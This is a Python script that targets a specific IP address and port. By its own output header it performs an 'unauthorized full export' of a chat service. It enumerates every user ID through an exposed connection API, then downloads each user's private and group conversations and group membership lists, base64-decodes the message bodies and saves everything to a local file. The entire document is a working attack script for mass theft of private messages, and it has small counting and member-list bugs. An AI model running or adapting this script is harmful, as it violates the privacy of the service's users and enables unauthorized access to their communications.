# -*- coding: utf-8 -*-
import json, base64, datetime, urllib.request, urllib.parse, sys

BASE = "http://43.198.164.35:5300"
TS   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUT  = f"43.198.164.35_聊天记录全量_{TS}.md"
PAGE = 100  # 每页条数

def req(path):
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return json.loads(r.read().decode())

def take_uid(it):
    if isinstance(it, dict):
        for k in ("uid", "user_id"):
            if it.get(k) is not None: return it[k]
    elif isinstance(it, (str, int)): return it
    return None

def find(obj, key):
    out = []
    def walk(o):
        if isinstance(o, list):
            for x in o: walk(x)
        elif isinstance(o, dict):
            if o.get(key) is not None: out.append(o)
            else:
                for v in o.values(): walk(v)
    walk(obj)
    return out

# ---------- 全量取消息：按 last_message_seq 游标翻页 ----------
def fetch_msgs(channel_id, ctype, limit=200):
    msgs, cursor, guard = [], 0, 0
    while guard < 200:  # 安全上限 200 页
        q = urllib.parse.urlencode({
            "channel_id": channel_id,
            "channel_type": ctype,
            "limit": limit,
            "last_message_seq": cursor,
        })
        d = req("/api/messages?" + q)
        arr = d.get("data") if isinstance(d, dict) else d
        if not isinstance(arr, list): arr = []
        if not arr: break
        msgs += arr
        # 下一页游标 = 返回里最大的 seq
        mx = arr[-1].get("seq") or (d or {}).get("max_message_seq") or cursor
        if mx == cursor: break
        cursor = mx
        guard += 1
        if len(arr) < limit: break
    return msgs

def b64_to_text(v):
    """payload 是 base64 JSON，解码取 content/text"""
    if isinstance(v, (dict, list)): return v
    if not isinstance(v, str): return str(v)
    try:
        dec = base64.b64decode(v, validate=False).decode("utf-8", "replace")
        o = json.loads(dec)
        if isinstance(o, dict):
            for k in ("content", "text", "msg", "body"):
                if o.get(k) is not None: return o[k]
            return dec
        return dec
    except Exception:
        return v

def norm(m):
    """从单条消息里尽可能抽出 时间 / 发送人 / 内容"""
    if not isinstance(m, dict): return {"time": "-", "who": "-", "content": b64_to_text(m)}
    t = m.get("timestamp") or m.get("time") or m.get("create_at") or m.get("created_at")
    try: t = datetime.datetime.fromtimestamp(int(t)).isoformat(timespec="seconds")
    except Exception: t = t if t is not None else "-"
    who = (m.get("sender") or m.get("from") or m.get("from_user")
           or m.get("nickname") or m.get("uid") or m.get("userId") or "-")
    body = m.get("payload")
    if body is None:
        for k in ("content", "text", "body", "msg"):
            if m.get(k) is not None: body = m[k]; break
    return {"time": t, "who": who, "content": b64_to_text(body) if body is not None else json.dumps(m, ensure_ascii=False)}

# ---------- 1) 分页拉全部 uid ----------
uids, seen = [], set()
def fetch_uids():
    off, lim = 0, 200
    while True:
        d = req("/api/connz?" + urllib.parse.urlencode({"offset": off, "limit": lim}))
        arr = d.get("connections") if isinstance(d, dict) else d
        if not isinstance(arr, list): arr = []
        for it in arr:
            u = take_uid(it)
            if u not in seen:
                seen.add(u); uids.append(u)
        total = d.get("total") if isinstance(d, dict) else len(arr)
        off += len(arr)
        if not arr or (total and off >= total): break
fetch_uids()
print(f"[+] 共 {len(uids)} 个 uid", file=sys.stderr)

# ---------- 2) 逐 uid 逐 channel 取全量消息 ----------
lines = ["# 43.198.164.35:5300 未授权聊天记录全量导出", "",
         f"- 目标: `{BASE}`",
         f"- 导出时间: {datetime.datetime.now().isoformat(timespec='seconds')}",
         f"- uid 总数: **{len(uids)}**", "",
         "> channel_type: 1=私聊, 2=群聊；正文已 base64 解码", ""]
P = G = M = 0
for uid in uids:
    cv = req(f"/api/conversations?uid={uid}")
    chans = [c for c in find(cv, "channel_id") if c.get("channel_type") in (1, 2)]
    if not chans:
        lines += [f"## uid: `{uid}`", "- (无会话)", ""]; 
        print(f"[+] uid={uid} 无会话", file=sys.stderr); continue
    for c in sorted(chans, key=lambda x: -int(x.get("timestamp") or 0)):
        ctype = c["channel_type"]; cid = c["channel_id"]
        kind = "私聊" if ctype == 1 else "群聊"
        if ctype == 2: P += 1
        G += 1
        msgs = fetch_msgs(cid, ctype)
        M += len(msgs)
        lines += [f"### {kind} · channel `{cid}` · {kind}消息 {len(msgs)} 条" + (
            f" · 最后 {datetime.datetime.fromtimestamp(int(c['timestamp'])).isoformat(timespec='seconds')}" if c.get('timestamp') else ""), ""]
        if ctype == 2:
            try:
                chmeta = req(f"/api/channels?channel_id={cid}&channel_type=2")
                mem = find(chmeta, "uid")
                memids = sorted({take_uid(x) for x in chmeta if take_uid(x)})
                if memids:
                    lines += [f"- 成员({len(memids)}): {', '.join(map(str, memids))}", ""]
            except Exception: pass
        for m in msgs:
            n = norm(m)
            lines.append(f"- `{n['time']}` **{n['who']}**: {n['content']}")
        lines.append("")
    print(f"[+] uid={uid} 会话={len(chans)}", file=sys.stderr)

lines += ["---", f"**统计: {len(uids)} 个 uid / 私聊会话 {P} / 全部会话 {G} / 消息合计 {M} 条**"]
open(OUT, "w", encoding="utf-8").write("\n".join(lines))
print(f"\n[+] 完成: 会话 {G}, 消息 {M}", file=sys.stderr)
print(f"[+] 已保存到: {OUT}", file=sys.stderr)
